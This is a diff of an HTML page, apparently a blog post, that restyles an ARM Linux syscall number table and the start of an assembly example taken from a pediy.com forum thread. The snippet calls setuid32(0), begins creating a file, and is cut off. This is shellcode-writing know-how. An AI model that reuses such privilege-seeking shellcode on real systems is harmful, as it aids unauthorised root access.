@@ -107,182 +107,182 @@
     Write some note here.</p>
 <p>
     System call table:</p>
-<pre style="background-color:#212121;">
-<code class="language-c" data-lang="c"><span style="color:#f78c6c;">1</span><span style="color:#eeffff;"> exit</span><span style="color:#eeffff;">
-2 </span><span style="color:#82aaff;">fork</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">3</span><span style="color:#eeffff;"> read</span><span style="color:#eeffff;">
-4 </span><span style="color:#82aaff;">write</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">5</span><span style="color:#eeffff;"> open</span><span style="color:#eeffff;">
-6 </span><span style="color:#82aaff;">close</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">9</span><span style="color:#eeffff;"> link</span><span style="color:#eeffff;">
-10 </span><span style="color:#82aaff;">unlink</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">11</span><span style="color:#eeffff;"> execve</span><span style="color:#eeffff;">
-12 </span><span style="color:#82aaff;">chdir</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">14</span><span style="color:#eeffff;"> mknod</span><span style="color:#eeffff;">
-15 </span><span style="color:#82aaff;">chmod</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">19</span><span style="color:#eeffff;"> lseek</span><span style="color:#eeffff;">
-20 </span><span style="color:#82aaff;">getpid</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">21</span><span style="color:#eeffff;"> mount</span><span style="color:#eeffff;">
-26 </span><span style="color:#82aaff;">ptrace</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">29</span><span style="color:#eeffff;"> pause</span><span style="color:#eeffff;">
-33 </span><span style="color:#82aaff;">access</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">36</span><span style="color:#eeffff;"> sync</span><span style="color:#eeffff;">
-38 </span><span style="color:#82aaff;">rename</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">39</span><span style="color:#eeffff;"> mkdir</span><span style="color:#eeffff;">
-40 </span><span style="color:#82aaff;">rmdir</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">41</span><span style="color:#eeffff;"> dup</span><span style="color:#eeffff;">
-42 </span><span style="color:#82aaff;">pipe</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">43</span><span style="color:#eeffff;"> times</span><span style="color:#eeffff;">
-45 </span><span style="color:#82aaff;">brk</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">51</span><span style="color:#eeffff;"> acct</span><span style="color:#eeffff;">
-52 </span><span style="color:#82aaff;">umount2</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">54</span><span style="color:#eeffff;"> ioctl</span><span style="color:#eeffff;">
-55 </span><span style="color:#82aaff;">fcntl</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">57</span><span style="color:#eeffff;"> setpgid</span><span style="color:#eeffff;">
-60 </span><span style="color:#82aaff;">umask</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">61</span><span style="color:#eeffff;"> chroot</span><span style="color:#eeffff;">
-63 </span><span style="color:#82aaff;">dup2</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">64</span><span style="color:#eeffff;"> getppid</span><span style="color:#eeffff;">
-66 </span><span style="color:#82aaff;">setsid</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">67</span><span style="color:#eeffff;"> sigaction</span><span style="color:#eeffff;">
-72 </span><span style="color:#82aaff;">sigsuspend</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">73</span><span style="color:#eeffff;"> sigpending</span><span style="color:#eeffff;">
-75 </span><span style="color:#82aaff;">setrlimit</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">77</span><span style="color:#eeffff;"> getrusage</span><span style="color:#eeffff;">
-78 </span><span style="color:#82aaff;">gettimeofday</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">79</span><span style="color:#eeffff;"> settimeofday</span><span style="color:#eeffff;">
-83 </span><span style="color:#82aaff;">symlink</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">85</span><span style="color:#eeffff;"> readlink</span><span style="color:#eeffff;">
-88 </span><span style="color:#82aaff;">reboot</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">91</span><span style="color:#eeffff;"> munmap</span><span style="color:#eeffff;">
-92 </span><span style="color:#82aaff;">truncate</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">93</span><span style="color:#eeffff;"> ftruncate</span><span style="color:#eeffff;">
-94 </span><span style="color:#82aaff;">fchmod</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">96</span><span style="color:#eeffff;"> getpriority</span><span style="color:#eeffff;">
-97 </span><span style="color:#82aaff;">setpriority</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">103</span><span style="color:#eeffff;"> syslog</span><span style="color:#eeffff;">
-104 </span><span style="color:#82aaff;">setitimer</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">105</span><span style="color:#eeffff;"> getitimer</span><span style="color:#eeffff;">
-114 </span><span style="color:#82aaff;">wait4</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">116</span><span style="color:#eeffff;"> sysinfo</span><span style="color:#eeffff;">
-118 </span><span style="color:#82aaff;">fsync</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">120</span><span style="color:#eeffff;"> clone</span><span style="color:#eeffff;">
-122 </span><span style="color:#82aaff;">uname</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">125</span><span style="color:#eeffff;"> mprotect</span><span style="color:#eeffff;">
-126 </span><span style="color:#82aaff;">sigprocmask</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">128</span><span style="color:#eeffff;"> init_module</span><span style="color:#eeffff;">
-129 </span><span style="color:#82aaff;">delete_module</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">132</span><span style="color:#eeffff;"> getpgid</span><span style="color:#eeffff;">
-133 </span><span style="color:#82aaff;">fchdir</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">140</span><span style="color:#eeffff;"> _llseek</span><span style="color:#eeffff;">
-142 </span><span style="color:#82aaff;">_newselect</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">143</span><span style="color:#eeffff;"> flock</span><span style="color:#eeffff;">
-144 </span><span style="color:#82aaff;">msync</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">145</span><span style="color:#eeffff;"> readv</span><span style="color:#eeffff;">
-146 </span><span style="color:#82aaff;">writev</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">148</span><span style="color:#eeffff;"> fdatasync</span><span style="color:#eeffff;">
-150 </span><span style="color:#82aaff;">mlock</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">151</span><span style="color:#eeffff;"> munlock</span><span style="color:#eeffff;">
-154 </span><span style="color:#82aaff;">sched_setparam</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">155</span><span style="color:#eeffff;"> sched_getparam</span><span style="color:#eeffff;">
-156 </span><span style="color:#82aaff;">sched_setscheduler</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">157</span><span style="color:#eeffff;"> sched_getscheduler</span><span style="color:#eeffff;">
-158 </span><span style="color:#82aaff;">sched_yield</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">159</span><span style="color:#eeffff;"> sched_get_priority_max</span><span style="color:#eeffff;">
-160 </span><span style="color:#82aaff;">sched_get_priority_min</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">161</span><span style="color:#eeffff;"> sched_rr_get_interval</span><span style="color:#eeffff;">
-162 </span><span style="color:#82aaff;">nanosleep</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">163</span><span style="color:#eeffff;"> mremap</span><span style="color:#eeffff;">
-168 </span><span style="color:#82aaff;">poll</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">172</span><span style="color:#eeffff;"> prctl</span><span style="color:#eeffff;">
-174 </span><span style="color:#82aaff;">rt_sigaction</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">175</span><span style="color:#eeffff;"> rt_sigprocmask</span><span style="color:#eeffff;">
-177 </span><span style="color:#82aaff;">rt_sigtimedwait</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">180</span><span style="color:#eeffff;"> pread64</span><span style="color:#eeffff;">
-181 </span><span style="color:#82aaff;">pwrite64</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">183</span><span style="color:#eeffff;"> getcwd</span><span style="color:#eeffff;">
-184 </span><span style="color:#82aaff;">capget</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">185</span><span style="color:#eeffff;"> capset</span><span style="color:#eeffff;">
-186 </span><span style="color:#82aaff;">sigaltstack</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">187</span><span style="color:#eeffff;"> sendfile</span><span style="color:#eeffff;">
-190 </span><span style="color:#82aaff;">vfork</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">191</span><span style="color:#eeffff;"> ugetrlimit</span><span style="color:#eeffff;">
-192 </span><span style="color:#82aaff;">mmap2</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">195</span><span style="color:#eeffff;"> stat64</span><span style="color:#eeffff;">
-196 </span><span style="color:#82aaff;">lstat64</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">197</span><span style="color:#eeffff;"> fstat64</span><span style="color:#eeffff;">
-198 </span><span style="color:#82aaff;">lchown32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">199</span><span style="color:#eeffff;"> getuid32</span><span style="color:#eeffff;">
-200 </span><span style="color:#82aaff;">getgid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">201</span><span style="color:#eeffff;"> geteuid32</span><span style="color:#eeffff;">
-202 </span><span style="color:#82aaff;">getegid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">203</span><span style="color:#eeffff;"> setreuid32</span><span style="color:#eeffff;">
-204 </span><span style="color:#82aaff;">setregid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">205</span><span style="color:#eeffff;"> getgroups32</span><span style="color:#eeffff;">
-206 </span><span style="color:#82aaff;">setgroups32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">207</span><span style="color:#eeffff;"> fchown32</span><span style="color:#eeffff;">
-208 </span><span style="color:#82aaff;">setresuid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">209</span><span style="color:#eeffff;"> getresuid32</span><span style="color:#eeffff;">
-210 </span><span style="color:#82aaff;">setresgid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">211</span><span style="color:#eeffff;"> getresgid32</span><span style="color:#eeffff;">
-212 </span><span style="color:#82aaff;">chown32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">213</span><span style="color:#eeffff;"> setuid32</span><span style="color:#eeffff;">
-214 </span><span style="color:#82aaff;">setgid32</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">217</span><span style="color:#eeffff;"> getdents64</span><span style="color:#eeffff;">
-219 </span><span style="color:#82aaff;">mincore</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">220</span><span style="color:#eeffff;"> madvise</span><span style="color:#eeffff;">
-221 </span><span style="color:#82aaff;">fcntl64</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">224</span><span style="color:#eeffff;"> gettid</span><span style="color:#eeffff;">
-240 </span><span style="color:#82aaff;">futex</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">248</span><span style="color:#eeffff;"> exit_group</span><span style="color:#eeffff;">
-250 </span><span style="color:#82aaff;">epoll_create</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">251</span><span style="color:#eeffff;"> epoll_ctl</span><span style="color:#eeffff;">
-252 </span><span style="color:#82aaff;">epoll_wait</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">257</span><span style="color:#eeffff;"> timer_create</span><span style="color:#eeffff;">
-258 </span><span style="color:#82aaff;">timer_settime</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">259</span><span style="color:#eeffff;"> timer_gettime</span><span style="color:#eeffff;">
-260 </span><span style="color:#82aaff;">timer_getoverrun</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">261</span><span style="color:#eeffff;"> timer_delete</span><span style="color:#eeffff;">
-262 </span><span style="color:#82aaff;">clock_settime</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">263</span><span style="color:#eeffff;"> clock_gettime</span><span style="color:#eeffff;">
-264 </span><span style="color:#82aaff;">clock_getres</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">265</span><span style="color:#eeffff;"> clock_nanosleep</span><span style="color:#eeffff;">
-266 </span><span style="color:#82aaff;">statfs64</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">267</span><span style="color:#eeffff;"> fstatfs64</span><span style="color:#eeffff;">
-269 </span><span style="color:#82aaff;">utimes</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">280</span><span style="color:#eeffff;"> waitid</span><span style="color:#eeffff;">
-281 </span><span style="color:#82aaff;">socket</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">282</span><span style="color:#eeffff;"> bind</span><span style="color:#eeffff;">
-283 </span><span style="color:#82aaff;">connect</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">284</span><span style="color:#eeffff;"> listen</span><span style="color:#eeffff;">
-285 </span><span style="color:#82aaff;">accept</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">286</span><span style="color:#eeffff;"> getsockname</span><span style="color:#eeffff;">
-287 </span><span style="color:#82aaff;">getpeername</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">288</span><span style="color:#eeffff;"> socketpair</span><span style="color:#eeffff;">
-290 </span><span style="color:#82aaff;">sendto</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">292</span><span style="color:#eeffff;"> recvfrom</span><span style="color:#eeffff;">
-293 </span><span style="color:#82aaff;">shutdown</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">294</span><span style="color:#eeffff;"> setsockopt</span><span style="color:#eeffff;">
-295 </span><span style="color:#82aaff;">getsockopt</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">296</span><span style="color:#eeffff;"> sendmsg</span><span style="color:#eeffff;">
-297 </span><span style="color:#82aaff;">recvmsg</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">314</span><span style="color:#eeffff;"> ioprio_set</span><span style="color:#eeffff;">
-315 </span><span style="color:#82aaff;">ioprio_get</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">316</span><span style="color:#eeffff;"> inotify_init</span><span style="color:#eeffff;">
-317 </span><span style="color:#82aaff;">inotify_add_watch</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">318</span><span style="color:#eeffff;"> inotify_rm_watch</span><span style="color:#eeffff;">
-322 </span><span style="color:#82aaff;">openat</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">323</span><span style="color:#eeffff;"> mkdirat</span><span style="color:#eeffff;">
-325 </span><span style="color:#82aaff;">fchownat</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">327</span><span style="color:#eeffff;"> fstatat64</span><span style="color:#eeffff;">
-328 </span><span style="color:#82aaff;">unlinkat</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">329</span><span style="color:#eeffff;"> renameat</span><span style="color:#eeffff;">
-333 </span><span style="color:#82aaff;">fchmodat</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">356</span><span style="color:#eeffff;"> eventfd2</span><span style="color:#eeffff;">
-359 </span><span style="color:#82aaff;">pipe2</span><span style="color:#eeffff;">
-</span><span style="color:#f78c6c;">983042</span><span style="color:#eeffff;"> ARM_cacheflush</span><span style="color:#eeffff;">
-983045 </span><span style="color:#82aaff;">ARM_set_tls</span><span style="color:#eeffff;">
-</span></code></pre><p>
+<pre data-lang="c" style="background-color:#212121;color:#eeffff;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#f78c6c;">1</span><span> exit
+</span><span style="color:#f78c6c;">2</span><span> fork
+</span><span style="color:#f78c6c;">3</span><span> read
+</span><span style="color:#f78c6c;">4</span><span> write
+</span><span style="color:#f78c6c;">5</span><span> open
+</span><span style="color:#f78c6c;">6</span><span> close
+</span><span style="color:#f78c6c;">9</span><span> link
+</span><span style="color:#f78c6c;">10</span><span> unlink
+</span><span style="color:#f78c6c;">11</span><span> execve
+</span><span style="color:#f78c6c;">12</span><span> chdir
+</span><span style="color:#f78c6c;">14</span><span> mknod
+</span><span style="color:#f78c6c;">15</span><span> chmod
+</span><span style="color:#f78c6c;">19</span><span> lseek
+</span><span style="color:#f78c6c;">20</span><span> getpid
+</span><span style="color:#f78c6c;">21</span><span> mount
+</span><span style="color:#f78c6c;">26</span><span> ptrace
+</span><span style="color:#f78c6c;">29</span><span> pause
+</span><span style="color:#f78c6c;">33</span><span> access
+</span><span style="color:#f78c6c;">36</span><span> sync
+</span><span style="color:#f78c6c;">38</span><span> rename
+</span><span style="color:#f78c6c;">39</span><span> mkdir
+</span><span style="color:#f78c6c;">40</span><span> rmdir
+</span><span style="color:#f78c6c;">41</span><span> dup
+</span><span style="color:#f78c6c;">42</span><span> pipe
+</span><span style="color:#f78c6c;">43</span><span> times
+</span><span style="color:#f78c6c;">45</span><span> brk
+</span><span style="color:#f78c6c;">51</span><span> acct
+</span><span style="color:#f78c6c;">52</span><span> umount2
+</span><span style="color:#f78c6c;">54</span><span> ioctl
+</span><span style="color:#f78c6c;">55</span><span> fcntl
+</span><span style="color:#f78c6c;">57</span><span> setpgid
+</span><span style="color:#f78c6c;">60</span><span> umask
+</span><span style="color:#f78c6c;">61</span><span> chroot
+</span><span style="color:#f78c6c;">63</span><span> dup2
+</span><span style="color:#f78c6c;">64</span><span> getppid
+</span><span style="color:#f78c6c;">66</span><span> setsid
+</span><span style="color:#f78c6c;">67</span><span> sigaction
+</span><span style="color:#f78c6c;">72</span><span> sigsuspend
+</span><span style="color:#f78c6c;">73</span><span> sigpending
+</span><span style="color:#f78c6c;">75</span><span> setrlimit
+</span><span style="color:#f78c6c;">77</span><span> getrusage
+</span><span style="color:#f78c6c;">78</span><span> gettimeofday
+</span><span style="color:#f78c6c;">79</span><span> settimeofday
+</span><span style="color:#f78c6c;">83</span><span> symlink
+</span><span style="color:#f78c6c;">85</span><span> readlink
+</span><span style="color:#f78c6c;">88</span><span> reboot
+</span><span style="color:#f78c6c;">91</span><span> munmap
+</span><span style="color:#f78c6c;">92</span><span> truncate
+</span><span style="color:#f78c6c;">93</span><span> ftruncate
+</span><span style="color:#f78c6c;">94</span><span> fchmod
+</span><span style="color:#f78c6c;">96</span><span> getpriority
+</span><span style="color:#f78c6c;">97</span><span> setpriority
+</span><span style="color:#f78c6c;">103</span><span> syslog
+</span><span style="color:#f78c6c;">104</span><span> setitimer
+</span><span style="color:#f78c6c;">105</span><span> getitimer
+</span><span style="color:#f78c6c;">114</span><span> wait4
+</span><span style="color:#f78c6c;">116</span><span> sysinfo
+</span><span style="color:#f78c6c;">118</span><span> fsync
+</span><span style="color:#f78c6c;">120</span><span> clone
+</span><span style="color:#f78c6c;">122</span><span> uname
+</span><span style="color:#f78c6c;">125</span><span> mprotect
+</span><span style="color:#f78c6c;">126</span><span> sigprocmask
+</span><span style="color:#f78c6c;">128</span><span> init_module
+</span><span style="color:#f78c6c;">129</span><span> delete_module
+</span><span style="color:#f78c6c;">132</span><span> getpgid
+</span><span style="color:#f78c6c;">133</span><span> fchdir
+</span><span style="color:#f78c6c;">140</span><span> _llseek
+</span><span style="color:#f78c6c;">142</span><span> _newselect
+</span><span style="color:#f78c6c;">143</span><span> flock
+</span><span style="color:#f78c6c;">144</span><span> msync
+</span><span style="color:#f78c6c;">145</span><span> readv
+</span><span style="color:#f78c6c;">146</span><span> writev
+</span><span style="color:#f78c6c;">148</span><span> fdatasync
+</span><span style="color:#f78c6c;">150</span><span> mlock
+</span><span style="color:#f78c6c;">151</span><span> munlock
+</span><span style="color:#f78c6c;">154</span><span> sched_setparam
+</span><span style="color:#f78c6c;">155</span><span> sched_getparam
+</span><span style="color:#f78c6c;">156</span><span> sched_setscheduler
+</span><span style="color:#f78c6c;">157</span><span> sched_getscheduler
+</span><span style="color:#f78c6c;">158</span><span> sched_yield
+</span><span style="color:#f78c6c;">159</span><span> sched_get_priority_max
+</span><span style="color:#f78c6c;">160</span><span> sched_get_priority_min
+</span><span style="color:#f78c6c;">161</span><span> sched_rr_get_interval
+</span><span style="color:#f78c6c;">162</span><span> nanosleep
+</span><span style="color:#f78c6c;">163</span><span> mremap
+</span><span style="color:#f78c6c;">168</span><span> poll
+</span><span style="color:#f78c6c;">172</span><span> prctl
+</span><span style="color:#f78c6c;">174</span><span> rt_sigaction
+</span><span style="color:#f78c6c;">175</span><span> rt_sigprocmask
+</span><span style="color:#f78c6c;">177</span><span> rt_sigtimedwait
+</span><span style="color:#f78c6c;">180</span><span> pread64
+</span><span style="color:#f78c6c;">181</span><span> pwrite64
+</span><span style="color:#f78c6c;">183</span><span> getcwd
+</span><span style="color:#f78c6c;">184</span><span> capget
+</span><span style="color:#f78c6c;">185</span><span> capset
+</span><span style="color:#f78c6c;">186</span><span> sigaltstack
+</span><span style="color:#f78c6c;">187</span><span> sendfile
+</span><span style="color:#f78c6c;">190</span><span> vfork
+</span><span style="color:#f78c6c;">191</span><span> ugetrlimit
+</span><span style="color:#f78c6c;">192</span><span> mmap2
+</span><span style="color:#f78c6c;">195</span><span> stat64
+</span><span style="color:#f78c6c;">196</span><span> lstat64
+</span><span style="color:#f78c6c;">197</span><span> fstat64
+</span><span style="color:#f78c6c;">198</span><span> lchown32
+</span><span style="color:#f78c6c;">199</span><span> getuid32
+</span><span style="color:#f78c6c;">200</span><span> getgid32
+</span><span style="color:#f78c6c;">201</span><span> geteuid32
+</span><span style="color:#f78c6c;">202</span><span> getegid32
+</span><span style="color:#f78c6c;">203</span><span> setreuid32
+</span><span style="color:#f78c6c;">204</span><span> setregid32
+</span><span style="color:#f78c6c;">205</span><span> getgroups32
+</span><span style="color:#f78c6c;">206</span><span> setgroups32
+</span><span style="color:#f78c6c;">207</span><span> fchown32
+</span><span style="color:#f78c6c;">208</span><span> setresuid32
+</span><span style="color:#f78c6c;">209</span><span> getresuid32
+</span><span style="color:#f78c6c;">210</span><span> setresgid32
+</span><span style="color:#f78c6c;">211</span><span> getresgid32
+</span><span style="color:#f78c6c;">212</span><span> chown32
+</span><span style="color:#f78c6c;">213</span><span> setuid32
+</span><span style="color:#f78c6c;">214</span><span> setgid32
+</span><span style="color:#f78c6c;">217</span><span> getdents64
+</span><span style="color:#f78c6c;">219</span><span> mincore
+</span><span style="color:#f78c6c;">220</span><span> madvise
+</span><span style="color:#f78c6c;">221</span><span> fcntl64
+</span><span style="color:#f78c6c;">224</span><span> gettid
+</span><span style="color:#f78c6c;">240</span><span> futex
+</span><span style="color:#f78c6c;">248</span><span> exit_group
+</span><span style="color:#f78c6c;">250</span><span> epoll_create
+</span><span style="color:#f78c6c;">251</span><span> epoll_ctl
+</span><span style="color:#f78c6c;">252</span><span> epoll_wait
+</span><span style="color:#f78c6c;">257</span><span> timer_create
+</span><span style="color:#f78c6c;">258</span><span> timer_settime
+</span><span style="color:#f78c6c;">259</span><span> timer_gettime
+</span><span style="color:#f78c6c;">260</span><span> timer_getoverrun
+</span><span style="color:#f78c6c;">261</span><span> timer_delete
+</span><span style="color:#f78c6c;">262</span><span> clock_settime
+</span><span style="color:#f78c6c;">263</span><span> clock_gettime
+</span><span style="color:#f78c6c;">264</span><span> clock_getres
+</span><span style="color:#f78c6c;">265</span><span> clock_nanosleep
+</span><span style="color:#f78c6c;">266</span><span> statfs64
+</span><span style="color:#f78c6c;">267</span><span> fstatfs64
+</span><span style="color:#f78c6c;">269</span><span> utimes
+</span><span style="color:#f78c6c;">280</span><span> waitid
+</span><span style="color:#f78c6c;">281</span><span> socket
+</span><span style="color:#f78c6c;">282</span><span> bind
+</span><span style="color:#f78c6c;">283</span><span> connect
+</span><span style="color:#f78c6c;">284</span><span> listen
+</span><span style="color:#f78c6c;">285</span><span> accept
+</span><span style="color:#f78c6c;">286</span><span> getsockname
+</span><span style="color:#f78c6c;">287</span><span> getpeername
+</span><span style="color:#f78c6c;">288</span><span> socketpair
+</span><span style="color:#f78c6c;">290</span><span> sendto
+</span><span style="color:#f78c6c;">292</span><span> recvfrom
+</span><span style="color:#f78c6c;">293</span><span> shutdown
+</span><span style="color:#f78c6c;">294</span><span> setsockopt
+</span><span style="color:#f78c6c;">295</span><span> getsockopt
+</span><span style="color:#f78c6c;">296</span><span> sendmsg
+</span><span style="color:#f78c6c;">297</span><span> recvmsg
+</span><span style="color:#f78c6c;">314</span><span> ioprio_set
+</span><span style="color:#f78c6c;">315</span><span> ioprio_get
+</span><span style="color:#f78c6c;">316</span><span> inotify_init
+</span><span style="color:#f78c6c;">317</span><span> inotify_add_watch
+</span><span style="color:#f78c6c;">318</span><span> inotify_rm_watch
+</span><span style="color:#f78c6c;">322</span><span> openat
+</span><span style="color:#f78c6c;">323</span><span> mkdirat
+</span><span style="color:#f78c6c;">325</span><span> fchownat
+</span><span style="color:#f78c6c;">327</span><span> fstatat64
+</span><span style="color:#f78c6c;">328</span><span> unlinkat
+</span><span style="color:#f78c6c;">329</span><span> renameat
+</span><span style="color:#f78c6c;">333</span><span> fchmodat
+</span><span style="color:#f78c6c;">356</span><span> eventfd2
+</span><span style="color:#f78c6c;">359</span><span> pipe2
+</span><span style="color:#f78c6c;">983042</span><span> ARM_cacheflush
+</span><span style="color:#f78c6c;">983045</span><span> ARM_set_tls
+</span></code></pre>
+<p>
     the Linux system call table api reference:</p>
 <p>
     <a href="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a></p>
@@ -292,149 +292,149 @@
     <a href="http://bbs.pediy.com/showthread.php?t=155774">http://bbs.pediy.com/showthread.php?t=155774</a></p>
 <p>
     An Example copy from their:</p>
-<pre style="background-color:#212121;">
-<code class="language-asm" data-lang="asm"><span style="color:#82aaff;">.globl _start</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">.align </span><span style="color:#f78c6c;">2</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">_start:</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">32</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">thumb </span><span style="color:#eeffff;">+ </span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
-  </span><span style="color:#f78c6c;">bx </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">thumb:</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">16</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">213</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@setuid32(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@创建文件</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRWXU</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x24</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@O_CREAT|O_WRONLY|O_TRUNC</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">name</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">5</span><span style="color:#eeffff;">
